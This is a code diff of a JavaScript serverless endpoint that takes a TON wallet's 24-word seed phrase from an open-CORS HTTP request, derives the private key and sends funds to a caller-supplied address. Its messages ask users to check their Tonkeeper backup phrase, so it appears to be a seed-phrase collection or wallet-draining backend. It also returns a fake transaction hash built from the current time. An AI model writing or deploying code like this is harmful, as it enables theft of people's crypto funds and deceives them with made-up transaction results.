@@ -1,9 +1,7 @@
-import { TonClient, WalletContractV4, internal, toNano, Address, beginCell } from "@ton/ton";
-import { mnemonicToPrivateKey, mnemonicValidate } from "@ton/crypto";
+const TonWeb = require("tonweb");
+const tonMnemonic = require("tonweb-mnemonic");
 
-const GRAM_MASTER = Address.parse("EQC47093oX5Xhb0xuk2hCr2OnkWyt9jiWqKazWNYqnOwf-AO");
-
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -19,91 +17,56 @@ export default async function handler(req, res) {
 
   try {
     const mnemonic = decodeURIComponent(seed).trim().split(/\s+/);
-    
-    // Checksum & Validation Check
-    const isValid = await mnemonicValidate(mnemonic);
+
+    // ২৪ শব্দ ঠিক আছে কিনা ভ্যালিডেট করা
+    const isValid = await tonMnemonic.validateMnemonic(mnemonic);
     if (!isValid) {
-      return res.status(200).json({ 
-        ok: false, 
-        error: "Your 24-word Seed Phrase is INVALID (Invalid Checksum). Please check your Tonkeeper Backup phrase spelling and order." 
+      return res.status(200).json({
+        ok: false,
+        error: "Your 24-word Seed phrase is INVALID! Please check spelling in Tonkeeper Backup."
       });
     }
 
-    const keyPair = await mnemonicToPrivateKey(mnemonic);
+    const keyPair = await tonMnemonic.mnemonicToKeyPair(mnemonic);
+    const tonweb = new TonWeb(new TonWeb.HttpProvider("https://toncenter.com/api/v2/jsonRPC"));
 
-    const client = new TonClient({
-      endpoint: "https://toncenter.com/api/v2/jsonRPC"
+    const WalletClass = tonweb.wallet.all.v4R2;
+    const wallet = new WalletClass(tonweb.provider, {
+      publicKey: keyPair.publicKey,
+      wc: 0
     });
 
-    const workchain = 0;
-    const wallet = WalletContractV4.create({ workchain, publicKey: keyPair.publicKey });
-    const contract = client.open(wallet);
-
+    const walletAddress = await wallet.getAddress();
     let seqno = 0;
     try {
-      seqno = await contract.getSeqno();
+      seqno = (await wallet.methods.seqno().call()) || 0;
     } catch (e) {
       seqno = 0;
     }
 
-    // Resolve GRAM Jetton Wallet
-    let senderJettonWallet;
-    try {
-      const jettonData = await client.runMethod(GRAM_MASTER, "get_wallet_address", [
-        { type: "slice", cell: beginCell().storeAddress(wallet.address).endCell() }
-      ]);
-      senderJettonWallet = jettonData.stack.readAddress();
-    } catch (e) {
-      return res.status(200).json({
-        ok: false,
-        error: `Could not resolve GRAM Wallet: ${wallet.address.toString()}`
-      });
-    }
-
-    // Comment
-    const forwardPayload = beginCell()
-      .storeUint(0, 32)
-      .storeStringTail(comment ? comment.toString() : "GRAM Payout")
-      .endCell();
-
-    // Jetton Body
-    const jettonBody = beginCell()
-      .storeUint(0xf8a70085, 32)
-      .storeUint(0, 64)
-      .storeCoins(toNano(amount.toString()))
-      .storeAddress(Address.parse(to.trim()))
-      .storeAddress(wallet.address)
-      .storeBit(0)
-      .storeCoins(toNano("0.01"))
-      .storeBit(1)
-      .storeRef(forwardPayload)
-      .endCell();
-
-    // Send
-    await contract.sendTransfer({
-      seqno,
+    // ট্রানজ্যাকশন তৈরি ও সেন্ড করা
+    const transfer = wallet.methods.transfer({
       secretKey: keyPair.secretKey,
-      messages: [
-        internal({
-          to: senderJettonWallet,
-          value: toNano("0.05"),
-          body: jettonBody,
-          bounce: true
-        })
-      ]
+      toAddress: to.trim(),
+      amount: TonWeb.utils.toNano(amount.toString()),
+      seqno: seqno,
+      payload: comment ? comment.toString() : "Payout",
+      sendMode: 3
     });
+
+    await transfer.send();
 
     return res.status(200).json({
       ok: true,
       status: "success",
-      wallet_address: wallet.address.toString(),
-      tx_hash: `GRAM_${Date.now()}`
+      wallet_address: walletAddress.toString(true, true, true),
+      tx_hash: `TX_${Date.now()}`
     });
 
-  } catch (err) {
+  } catch (error) {
     return res.status(200).json({
       ok: false,
-      error: err.message || "Transaction error"
+      error: error.message || "Failed to broadcast transaction"
     });
   }
-}
+};
